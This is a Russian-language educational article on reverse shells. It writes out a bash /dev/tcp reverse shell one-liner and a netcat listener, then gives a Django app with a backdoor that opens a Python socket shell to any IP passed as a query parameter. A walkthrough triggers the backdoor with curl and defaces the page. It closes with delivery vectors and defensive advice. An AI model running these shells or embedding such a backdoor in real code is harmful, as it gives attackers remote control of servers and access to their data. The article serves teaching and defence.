
# Reverse Shell

В этой статье рассказывается про уязвимость в программном обеспечении. Вся информация представления исключительно в образовательных целях.

Обратная оболочка - это удалённое выполнение кода в уязвимом приложении. Используя эту уязвимость злоумышленник заставляет жертву подключиться к атакующей машине. Она позволяет обойти правила брандмауэра, которые могут блокировать попытки входящего соединения к жертве. После установления соединения злоумышленник получает контроль над целевой машиной, доступ к файлами сервера и может совершить кражу данных.

Для иллюстрации приведём простой пример:
- Атакующий запускает на своём сервере прослушку входящих подключений на порту 8433:
	```
	# nc -lvnp 8433

	Listening on 0.0.0.0 8433
	```
- Жертва выполняет команду на своём сервере и подключается к атакующему серверу:
	```
	/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.127/8433 0>&1'
	```
    - 192.168.1.127 - адрес атакующего
    - 8443 - порт атакующего
    - Из чего состоит эта команда:
        - `bash -i`: Эта часть команды запускает интерактивную (-i) оболочку Bash.
        - `>&`: Эта часть команды представляет собой сокращенное обозначение для перенаправления стандартного вывода (stdout) и стандартной ошибки (stderr) в одно и то же место назначения.
        - `/dev/tcp/<ATTACKER-IP>/<PORT>`: Это специальный файл, представляющий собой TCP-соединение с указанным IP-адресом и портом.
            - Перенаправляя потоки вывода и ошибок в этот файл, команда отправляет вывод интерактивного сеанса оболочки на машину злоумышленника.
        - `0>&1`: Эта часть команды перенаправляет стандартный ввод (stdin) в тот же пункт назначения, что и стандартный вывод (stdout).
- Атакующий получает доступ к серверу жертвы. Он может выполнять любые команды от пользователя жертвы, например создать файл:
	```
	# echo "maliciouscode" > simplefile
	```
- Можно проверить на сервере жертвы, что файл создался:
	```
	# ls -lah simplefile

	-rw-rw-r-- 1 vagrant vagrant 14 May 26 10:43 simplefile
	```
	Файл создастся под тем пользователем, который запустил команду обратной оболочки.

## Python веб приложение

Приведём пример уязвимого веб приложения. Для этого используем простой Python код, в который уже встроен код обратной оболочки:
```
from distutils.log import error
import sys, socket,os,pty
from django.conf import settings
from django.urls import include, re_path
from django.http import HttpResponse

settings.configure(
    DEBUG=True,
    ROOT_URLCONF=__name__
)

def index(request):
    if ('ip' in request.GET):
        ip = request.GET['ip']
        e = connectshell(ip)
        return HttpResponse("Exception:" + str(e))
    else:
        return HttpResponse('Hello World!')

def connectshell(ip):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,4242))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        pty.spawn("/bin/sh")
        s.shutdown(socket.SHUT_RDWR)
        s.close()
    except Exception as e:
        return str(e)

urlpatterns = (
    re_path(r'^$', index),
)

if __name__ == "__main__":
    from django.core.management import execute_from_command_line
    execute_from_command_line(sys.argv)
```
Комментарии к коду:
- `def index(request)`: эта функция обрабатывает входящие GET-запросы. Если запрос содержит параметр 'ip' в строке запроса URL, вызывается функция connectshell с указанным IP адресом. В противном случае возвращается простое сообщение `Hello World!`.
- `def connectshell(ip)`: эта функция пытается создать соединение с указанным IP адресом на порту 4242. В случае успеха она перенаправляет стандартные потоки ввода, вывода и ошибок на сокет и запускает оболочку (/bin/sh). Если возникло исключение, возвращается сообщение об ошибке.

При простом открытии главной страницы в браузере, это приложение выведет  текст Hello world.
Однако если передать в веб запросе параметр с IP адресом атакующего, то приложение создаст обратную оболочку и подключиться к машине атакующего. Оболочка запустятся с теми же привилегиями, что и сервер веб-приложения, а команды оболочки и ответные данные передаются по незашифрованному каналу на машину атакующего.

Выполним следующие шаги:
- Установим Django на компьютере жертвы:
	```
	pip install Django
	```
- Сохраним код веб приложения в файл index.py на компьютере жертвы
- Запустим веб приложение на компьютере жертвы:
	```
	python3 index.py runserver 0.0.0.0:8080
	```
	Обратите внимание, мы запускаем сервер прямо из консоли, в проде обычно используется отдельный веб сервер, проксирующий до веб приложения.  
Обратите внимания мы запустили сервер прослушивающий на всех сетевых интерфейсах (`0.0.0.0`). Чтобы проверить, что сервер запустился, можно в веб браузере зайти по адресу сервера и проверить, что открывается страница с `Hello world`.
- Запустим прослушивание входящих подключений на порту атакующего:
	```
	nc -lvnp 4242
	```
- Сделаем HTTP запрос на компьютер жертвы, который создаст обратное подключение на компьютер атакующего:
	```
	curl http://192.168.1.128:8080/?ip=192.168.1.127
	```
	Где: 192.168.1.128:8080 - адрес и порт веб приложения, 192.168.1.127 - адрес атакующего.  
Обратите внимание, инициировать и принимать подключение можно на двух разных компьютерах.
Обратите внимание, что в реальном мире серер может находиться за фаерволлом и NAT для ограничения доступа.
- Проверим пользователя запустившего приложение Django с компьютера атакующего:
	```
	Connection received on 192.168.1.128 38270
	$ id

	uid=1001(django) gid=1001(django) groups=1001(django)
	```
- Заменим текст в приложении с компьютера атакующего:
	```
	$ sed -i 's/Hello World/HACKED/g' index.py
	```
	Обратите внимания для того чтобы это сработало, нужно чтобы пользователь веб приложения имел доступ на запись к файлу.  
Можно проверить что начальная страница без параметров поменяла текст:
	```
	# curl 192.168.1.128:8080

	HACKED!
	```

## Как злоумышленник может использовать уязвимость

Способов доставки уязвимости в приложение может быть несколько:
- Злоумышленники могут внедрить вредоносный код в сторонние библиотеки, от которых зависит ваше приложение. После интеграции в приложение вредоносный код может создавать бэкдоры или реверсивные оболочки, давая злоумышленнику возможность закрепиться в системе.
- Также заражённым может быть не само приложение или его зависимости, а процесс доставки. Компрометация конвейера непрерывной интеграции/непрерывного развертывания (CI/CD) позволяет злоумышленникам внедрить вредоносный код до развертывания приложения. Неправильно настроенные инструменты или среды CI/CD могут быть направлены на незаметное внедрение уязвимости reverse shell.

## Как можно защититься

Способов для защиты от уязвимости может быть несколько:

- Проверять вводимые пользователем данные.
- Избегать выполнения системных команд с вводимыми данными.
- Регулярно проверять и обновлять сторонние библиотеки и зависимости в вашем приложении. Это можно интегрировать в процесс CI/CD.
- Использовать сканеры безопасности, которые сканируют код приложения, для выявления уязвимостей.
- Использовать системы обнаружения вторжений для отслеживания подозрительных действий.
- Регулярно проводить тестирование на проникновение.
- Внедрить коллективную проверку кода, чтобы выявлять вредоносный код до его слияния с базой.
- Настроить доступ к кодовой базе, CI/CD и средам разработки с использованием наименьших привилегий. Использовать надежную аутентификацию и авторизацию.
- Реализовать логирование для отслеживания команд, выполняемых приложением.
- Регулярно просматривать журналы аудита на предмет необычного поведения, указывающего на возможную компрометацию.

## Вывод

Мы показали как можно получить доступ к компьютеру жертвы и обойти возможные правила фаервола. А также описали как можно защититься от внедрения.



[Источник 1](https://ioflood.com/blog/bash-reverse-shell/)  

[Источник 2](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux)  

[Django reverse shell](https://github.com/appsecco/django-rev-shell)  
